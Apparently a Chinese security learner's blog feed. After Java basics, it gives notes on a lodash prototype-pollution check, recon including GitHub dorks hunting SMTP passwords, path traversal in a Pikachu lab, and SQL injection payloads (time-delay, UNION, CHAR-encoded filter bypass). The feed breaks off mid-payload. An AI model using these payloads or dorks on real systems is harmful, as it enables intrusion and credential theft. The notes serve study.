        <content type="html"><![CDATA[<h1 id="java基本语法"><a href="#java基本语法" class="headerlink" title="java基本语法"></a>java基本语法</h1><p>基础语法：</p><ul><li>对象：对象是类的一个实例，有状态和行为</li></ul><p>例如：一条狗是一个对象，他的状态就有：颜色，名字，品种；行为就有了：吃，坐下，叫等</p><ul><li><p>类：类是一个模板，他描述一类对象的行为和状态</p></li><li><p>方法：方法就是行为，一个类可以有很多方法，逻辑运算，数据修改以及所有动作都是在方法中完成的</p></li><li>实例变量：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定</li></ul><p>第一个java程序<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class the_first_java &#123;</span><br><span class="line">    /* 第一个Java程序</span><br><span class="line"></span><br><span class="line">  *它将输出字符串 Hello World</span><br><span class="line"></span><br><span class="line">   */</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        System.out.println(&quot;Hello World&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出应该是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello World</span><br></pre></td></tr></table></figure></p><p><img src="https://pic.imgdb.cn/item/66ec1db4f21886ccc0fb79df.png" alt=""></p><h2 id="java对象和类"><a href="#java对象和类" class="headerlink" title="java对象和类"></a>java对象和类</h2><p><img src="https://pic.imgdb.cn/item/66ec1e60f21886ccc0fc1ded.png" alt=""></p><h2 id="java创建对象"><a href="#java创建对象" class="headerlink" title="java创建对象"></a>java创建对象</h2><p>对象是根据类创建的。在Java中，使用关键字new来创建一个新的对象。创建对象需要以下三步：</p><ul><li><p>声明：声明一个对象，包括对象名称和对象类型。</p></li><li><p>实例化：使用关键字 new 来创建一个对象。</p></li><li><p>初始化：使用 new 创建对象时，会调用构造方法初始化对象。</p></li></ul><p>puppy<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Puppy &#123;</span><br><span class="line">    public Puppy(String name)&#123;</span><br><span class="line">        System.out.println(&quot;小狗的名字是&quot;+name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Puppy myPuppy = new Puppy(&quot;tommy&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>输出应该是:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小狗的名字是tommy</span><br></pre></td></tr></table></figure></p><h2 id="Java基本类型"><a href="#Java基本类型" class="headerlink" title="Java基本类型"></a>Java基本类型</h2><p><img src="https://pic.imgdb.cn/item/66ec23eef21886ccc00243ec.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    static boolean bool;</span><br><span class="line">    static byte by;</span><br><span class="line">    static  char ch;</span><br><span class="line">    static double d;</span><br><span class="line">    static float f;</span><br><span class="line">    static int i;</span><br><span class="line">    static long l;</span><br><span class="line">    static short sh;</span><br><span class="line">    static String str;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;Bool:&quot;+bool);</span><br><span class="line">        System.out.println(&quot;Byte:&quot;+by);</span><br><span class="line">        System.out.println(&quot;Char:&quot;+ch);</span><br><span class="line">        System.out.println(&quot;Double:&quot;+d);</span><br><span class="line">        System.out.println(&quot;Float:&quot;+f);</span><br><span class="line">        System.out.println(&quot;Int:&quot;+i);</span><br><span class="line">        System.out.println(&quot;Long:&quot;+l);</span><br><span class="line">        System.out.println(&quot;Short:&quot;+sh);</span><br><span class="line">        System.out.println(&quot;String:&quot;+str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Bool:false</span><br><span class="line">Byte:0</span><br><span class="line">Char:</span><br><span class="line">Double:0.0</span><br><span class="line">Float:0.0</span><br><span class="line">Int:0</span><br><span class="line">Long:0</span><br><span class="line">Short:0</span><br><span class="line">String:null</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="java循环结构"><a href="#java循环结构" class="headerlink" title="java循环结构"></a>java循环结构</h2><p>经典的三种循环方式:</p><ul><li>while 循环</li><li>do…while循环</li><li>for循环</li></ul><p>while实例<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class cycle &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int x=10;</span><br><span class="line">        while(x&lt;20)&#123;</span><br><span class="line">            System.out.println(&quot;value of x : &quot;+ x);</span><br><span class="line">            x++;</span><br><span class="line">//            System.out.println(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>输出<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">value of x : 10</span><br><span class="line">value of x : 11</span><br><span class="line">value of x : 12</span><br><span class="line">value of x : 13</span><br><span class="line">value of x : 14</span><br><span class="line">value of x : 15</span><br><span class="line">value of x : 16</span><br><span class="line">value of x : 17</span><br><span class="line">value of x : 18</span><br><span class="line">value of x : 19</span><br></pre></td></tr></table></figure><br>不知道为啥，按理说不应该不会换行的吗，怎么加了个换行符多一行🧐</p><p>do-while循环<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class text &#123;</span><br><span class="line">        public static void main(String args[]) &#123;</span><br><span class="line"></span><br><span class="line">            for(int x = 10; x &lt; 20; x = x+1) &#123;</span><br><span class="line">                System.out.print(&quot;value of x : &quot; + x );</span><br><span class="line">                System.out.print(&quot;\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>输出为<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">value of x : 10</span><br><span class="line">value of x : 11</span><br><span class="line">value of x : 12</span><br><span class="line">value of x : 13</span><br><span class="line">value of x : 14</span><br><span class="line">value of x : 15</span><br><span class="line">value of x : 16</span><br><span class="line">value of x : 17</span><br><span class="line">value of x : 18</span><br><span class="line">value of x : 19</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lodash</title>
      <link href="/2025/01/08/2024%E5%B9%B49%E6%9C%8812%E6%97%A5-lodash/"/>
      <url>/2025/01/08/2024%E5%B9%B49%E6%9C%8812%E6%97%A5-lodash/</url>
      
        <content type="html"><![CDATA[<p>今天打网站的时候无意中发现awvs报了一个lodash的漏洞，所以来记录一下</p><p>现在前端大多数是vue和react框架的，所以就少不了引入依赖，而lodash是一个流行的npm库，<br>检测方法很简单，在前端控制器输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const payload = &#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;lodash&quot;: true&#125;&#125;&#125;&#x27;</span><br><span class="line">_.defaultsDeep(&#123;&#125;, JSON.parse(payload))</span><br><span class="line">if(&#123;&#125;.lodash === true)&#123; alert(&quot;Bad news :(\nYou&#x27;re (still) vulnerable to Prototype Pollution&quot;) &#125; else &#123; alert(&quot;All Good! :)\nYou&#x27;re NOT vulnerable (anymore) to Prototype Pollution&quot;) &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果弹窗</p><p><img src="https://pic.imgdb.cn/item/66e2a05ad9c307b7e9af7070.png" alt=""></p><p>说明没问题,lodash是最新的，如果没有的花说明存在漏洞</p><p>漏洞原理：</p><p><a href="https://blog.csdn.net/qq_34761385/article/details/136799101">这篇写得好</a></p><p>(主要是我还没学完原型链…)</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪笔记day18-WEB攻防</title>
      <link href="/2025/01/08/2024%E5%B9%B48%E6%9C%887%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day7/"/>
      <url>/2025/01/08/2024%E5%B9%B48%E6%9C%887%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day7/</url>
      
        <content type="html"><![CDATA[<p>废了几天事，终于是把信息打点结束了，总的来说就是CDN的绕过，信息收集工具的使用，资产泄露，通过域名等方式获得真是IP地址，端口扫描，泄露的源码进行白盒分析以及黑引擎的使用等等</p><p>arl还不开源了，Kunyu的seebug我是半天没瞅到api在哪啊，哪个水泽，python的arl_revelor的是22年的吧，根本用不了，头大了都</p><p>总之，一言难尽</p><p>迪总下面的PHP开发我给跳过了，直接开始WEB攻防得了，博客的话，，额，你现在看的就是，至于上传什么的太麻烦了等我后面有时间再说吧(bushi)</p><p>——-以上来自一个配置环境快炸了的人</p><h1 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h1><p>一般都是windows iis asp access(sqlserver)</p><p>漏洞主要集中在iis 和 asp</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪笔记day67891011--信息打点</title>
      <link href="/2025/01/08/2024%E5%B9%B48%E6%9C%883%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day6/"/>
      <url>/2025/01/08/2024%E5%B9%B48%E6%9C%883%E6%97%A5-%E5%B0%8F%E8%BF%AA%E7%AC%94%E8%AE%B0day6/</url>
      
        <content type="html"><![CDATA[<h1 id="信息点："><a href="#信息点：" class="headerlink" title="信息点："></a>信息点：</h1><p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p><h1 id="技术点："><a href="#技术点：" class="headerlink" title="技术点："></a>技术点：</h1><p>CMS 识别，端口扫描，CDN 绕过，源码获取，子域名查询，WAF 识别，负载均衡识别等</p><h1 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h1><h2 id="ttl判断操作系统"><a href="#ttl判断操作系统" class="headerlink" title="ttl判断操作系统"></a>ttl判断操作系统</h2><p>linux的数是64或255</p><p>windows nt/2000/xp 是128</p><p>windows98 是32</p><p>unix是255</p><p>ping一下看距离哪一个更近就可以判断是那个（）</p><p>也可以直接上nmap等端口扫描开干</p><h2 id="数据库判断"><a href="#数据库判断" class="headerlink" title="数据库判断"></a>数据库判断</h2><p>组合 or 端口扫描</p><p>mysql 3306</p><p>mssql 1433</p><p>redis 6379</p><p>Oracle 1521</p><p>DB2 5000</p><p>postgresql 5432</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>互站  网上搜  fofa搜</p><p>（例：不知道还存不存在 面具约会）</p><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>composer.json(类似版权和声明的文件，一种php特性)</p><p>git 源码泄露</p><p>svn 源码泄露</p><p>hg 源码泄漏</p><p>网站备份压缩文件</p><p>WEB-INF/web.xml 泄露   [RoarCTF 2019]Easy Java</p><p>DS_Store 文件泄露</p><p>SWP 文件泄露</p><p>CVS 泄露</p><p>Bzr 泄露</p><p>GitHub 源码泄漏<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GITHUB 资源搜索：</span><br><span class="line">in:name test               #仓库标题搜索含有关键字</span><br><span class="line">in:descripton test         #仓库描述搜索含有关键字</span><br><span class="line">in:readme test             #Readme 文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 test</span><br><span class="line">#stars 数量大于 3000 的搜索关键字</span><br><span class="line">stars:1000..3000 test      #stars 数量 大 于 1000 小于 3000 的搜 索 关 键 字 forks:&gt;1000 test</span><br><span class="line">#forks 数量大于 1000 的搜索关键字</span><br><span class="line">forks:1000..3000 test      #forks 数量 大 于 1000 小于 3000 的搜 索 关 键 字 size:&gt;=5000 test</span><br><span class="line">#指定仓库大于 5000k(5M)的搜索关键字 pushed:&gt;2019-02-12 test    #发布时间大于 2019-02-12 的</span><br><span class="line">搜索 关 键 字 created:&gt;2019-02-12 test   # 创建 时 间 大 于 2019-02-12 的搜 索 关 键 字 user:test</span><br><span class="line">#用户名搜素</span><br><span class="line">license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字 language:java test         #在 java 语</span><br><span class="line">言的代码中搜索关键字</span><br><span class="line">user:test in:name test     #组合搜索,用户名 test 的标题含有 test 的</span><br><span class="line">关键字配合谷歌搜索：</span><br><span class="line">site:Github.com smtp</span><br><span class="line">site:Github.com smtp @qq.com</span><br><span class="line">site:Github.com smtp @126.com</span><br><span class="line">site:Github.com smtp @163.com</span><br><span class="line">site:Github.com smtp @sina.com.cn</span><br><span class="line">site:Github.com smtp password</span><br><span class="line">site:Github.com String password smtp</span><br></pre></td></tr></table></figure></p><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>可以看域名是否已经被注册，买域名</p><h2 id="备案"><a href="#备案" class="headerlink" title="备案"></a>备案</h2><p> beianx</p><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h2 id="cdn"><a href="#cdn" class="headerlink" title="cdn"></a>cdn</h2><p>超级ping一下就可以</p><p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p><a href="https://www.17ce.com/">https://www.17ce.com/</a></p><p><a href="https://tools.ipip.net/ping.php">https://tools.ipip.net/ping.php</a></p><h3 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h3><p>一把梭<br><a href="https://get-site-ip.com/">git-site-ip</a></p><h4 id="子域名入手"><a href="#子域名入手" class="headerlink" title="子域名入手"></a>子域名入手</h4><h4 id="利用网站漏洞"><a href="#利用网站漏洞" class="headerlink" title="利用网站漏洞"></a>利用网站漏洞</h4><h4 id="历史DNS记录"><a href="#历史DNS记录" class="headerlink" title="历史DNS记录"></a>历史DNS记录</h4><h4 id="cdn本身"><a href="#cdn本身" class="headerlink" title="cdn本身"></a>cdn本身</h4><p>获取控制面板，这个纯粹靠运气</p><h4 id="mx记录和邮件"><a href="#mx记录和邮件" class="headerlink" title="mx记录和邮件"></a>mx记录和邮件</h4><p>找回的地方发送邮件到你的邮箱，在qq邮箱中查看邮件原文就可以了<br><img src="https://pic.imgdb.cn/item/66b0880ad9c307b7e93f5424.png" alt=""></p><p>配合备案配合ip查询配合网站能得到真实ip</p><h4 id="国外请求："><a href="#国外请求：" class="headerlink" title="国外请求："></a>国外请求：</h4><p>可能仅针对国内进行了cdn加速，绕到国外就可以尝试了</p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><p>（阿里云CDN有个业务类型是<br><img src="https://pic.imgdb.cn/item/66b0814bd9c307b7e935c9ac.png" alt=""></p><p>超级ping:<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p>17ce.com</p><h4 id="超级ping"><a href="#超级ping" class="headerlink" title="超级ping"></a>超级ping</h4><h4 id="扫描探针"><a href="#扫描探针" class="headerlink" title="扫描探针"></a>扫描探针</h4><h1 id="zmap"><a href="#zmap" class="headerlink" title="### zmap"></a>### zmap</h1><p>44分大法（）</p><h4 id="黑暗引擎"><a href="#黑暗引擎" class="headerlink" title="黑暗引擎"></a>黑暗引擎</h4><p>zoomeye,fofa,shadon</p><h2 id="服务器负载均衡"><a href="#服务器负载均衡" class="headerlink" title="服务器负载均衡"></a>服务器负载均衡</h2><p>lbd—kali也有</p><h3 id="app"><a href="#app" class="headerlink" title="app"></a>app</h3><p>app的抓包封包监听等等的我跳了，目前用不上，后面用上了再加</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防--任意文件上传</title>
      <link href="/2025/01/08/2024%E5%B9%B48%E6%9C%8830%E6%97%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2025/01/08/2024%E5%B9%B48%E6%9C%8830%E6%97%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<p>恶意上传木马文件等行为，最容易获得webshell的方法</p><p>只要存在文件上传的地方都可以进行测试，都可能存在漏洞，微信,qq,论坛等地方都可能</p><p><img src="https://pic.imgdb.cn/item/66d13025d9c307b7e91834d6.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 守夜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防--任意文件下载</title>
      <link href="/2025/01/08/2024%E5%B9%B48%E6%9C%8827%E6%97%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
      <url>/2025/01/08/2024%E5%B9%B48%E6%9C%8827%E6%97%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p>以皮卡丘为例</p><p><img src="https://pic.imgdb.cn/item/66cece29d9c307b7e9574db5.png" alt=""></p><p>上面是url，页面上说了是点击头像下载头像图片</p><p>所以他的下载地址是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.31.172/pikachu/vul/unsafedownload/exedownload.php?filename=kb.png</span><br></pre></td></tr></table></figure><p>知道这个以后就可以进行目录穿越了，比如说这个文件夹下有个.ds_store的文件</p><p><img src="https://pic.imgdb.cn/item/66cecfdcd9c307b7e95c345c.png" alt=""></p><p>我就可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.31.172/pikachu/vul/unsafedownload/exedownload.php?filename=../../.ds_store</span><br></pre></td></tr></table></figure><p>把它下载下来</p><p>原理</p><p><img src="https://pic.imgdb.cn/item/66ced054d9c307b7e95e0853.png" alt=""></p><p>利用方式：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">一般链接利用方式</span><br><span class="line"></span><br><span class="line">download.php?path=</span><br><span class="line">down.php?file=</span><br><span class="line">download.php?filename=</span><br><span class="line">data.php?file=</span><br><span class="line"></span><br><span class="line">或者包含参数</span><br><span class="line"></span><br><span class="line">&amp;src=</span><br><span class="line">&amp;Data=</span><br><span class="line">&amp;Path=</span><br><span class="line">&amp;filepath=</span><br><span class="line">&amp;inputfile=</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="https://pic.imgdb.cn/item/66d11e36d9c307b7e9045875.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/66d11e4ad9c307b7e9046596.png" alt=""></p><p>漏洞修复:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.过滤.，使得用户不能回溯上一级目录i</span><br><span class="line">2.正则盐分判断用户输入参数的格式</span><br><span class="line">3.php.ini配置open_basedir限制文件访问范围</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 守夜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql语句积累</title>
      <link href="/2025/01/08/2024%E5%B9%B48%E6%9C%8825%E6%97%A5-sql%E8%AF%AD%E5%8F%A5%E7%A7%AF%E7%B4%AF/"/>
      <url>/2025/01/08/2024%E5%B9%B48%E6%9C%8825%E6%97%A5-sql%E8%AF%AD%E5%8F%A5%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<p>昨天刚重修完基本的sql注入的，今天看了看2023-2024的一些暴出来的sql漏洞，学习一下师傅们的注入手法，积累一下注入语句🤭</p><p>— 真的，不看不知道，一看真的是惊讶于师傅们的手法，真的，一个永真都玩出花了，果然我就是一个菜鸡<br><del>确信.jpg</del></p><h1 id="Sql-Server"><a href="#Sql-Server" class="headerlink" title="Sql Server"></a>Sql Server</h1><figure class="highlight plaintext"><figcaption><span>DELAY</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line">waitfor 有两种用法</span><br><span class="line">waitfor time  &#x27;10:01:01&#x27;指定10点1分2秒时执行</span><br><span class="line">waitfor delay &#x27;01:02:03&#x27;指定等待1小时2分钟3秒后执行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66cbd054d9c307b7e9d65a0b.png" alt=""></p><p>像是这个，就是一个延时注入的</p><h1 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h1><figure class="highlight plaintext"><figcaption><span>all</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">union all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#x27; UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL</span><br><span class="line"></span><br><span class="line">union all联合注入，需要注意的是munion all操作用于结合两个或更多 SELECT 语句的结果集，包括所有匹配的行，甚至包括重复的行，但是union会默认删除重复的行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">联合注入</span><br><span class="line"></span><br><span class="line">联合注入亦可以进行这样的</span><br><span class="line">action=GetDetail&amp;status=300&amp;id=1+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2885%29%2BCHAR%28122%29%2BCHAR%2883%29%2BCHAR%28113%29%2BCHAR%2890%29%2BCHAR%28120%29%2BCHAR%2888%29%2BCHAR%28103%29%2BCHAR%2886%29%2BCHAR%28122%29%2BCHAR%2876%29%2BCHAR%2881%29%2BCHAR%2868%29%2BCHAR%2871%29%2BCHAR%2866%29%2BCHAR%28104%29%2BCHAR%2872%29%2BCHAR%28117%29%2BCHAR%2890%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28117%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%28100%29%2BCHAR%28111%29%2BCHAR%28118%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28111%29%2BCHAR%2877%29%2BCHAR%2890%29%2BCHAR%28105%29%2BCHAR%28103%29%2BCHAR%28111%29%2BCHAR%2880%29%2BCHAR%28106%29%2BCHAR%2869%29%2BCHAR%2887%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+BUHl</span><br><span class="line"></span><br><span class="line">中间的经过url解码以后就是</span><br><span class="line">action=GetDetail&amp;status=300&amp;id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(122)+CHAR(113)+CHAR(85)+CHAR(122)+CHAR(83)+CHAR(113)+CHAR(90)+CHAR(120)+CHAR(88)+CHAR(103)+CHAR(86)+CHAR(122)+CHAR(76)+CHAR(81)+CHAR(68)+CHAR(71)+CHAR(66)+CHAR(104)+CHAR(72)+CHAR(117)+CHAR(90)+CHAR(112)+CHAR(106)+CHAR(117)+CHAR(105)+CHAR(65)+CHAR(100)+CHAR(111)+CHAR(118)+CHAR(119)+CHAR(119)+CHAR(119)+CHAR(111)+CHAR(77)+CHAR(90)+CHAR(105)+CHAR(103)+CHAR(111)+CHAR(80)+CHAR(106)+CHAR(69)+CHAR(87)+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--+BUHl</span><br><span class="line"></span><br><span class="line">提取char就是qpzzqUzSqZxXgVzLQDGBhHuZpjuiAdovwwwoMZigoPjEWqjkzq，这样绕过了对qpzzqUzSqZxXgVzLQDGBhHuZpjuiAdovwwwoMZigoPjEWqjkzq的限制</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">永真</span><br><span class="line"></span><br><span class="line">1 OR 3*2*1=6 AND 000322=000322&amp;order=desc&amp;request=watch&amp;sort=Id&amp;view=request</span><br><span class="line">这个我猜测可能是因为限制了1=1这个，随意当初打出来的师傅才进行了or 3*2*1=6 and 000322=000322</span><br><span class="line"></span><br><span class="line">2&#x27; AND 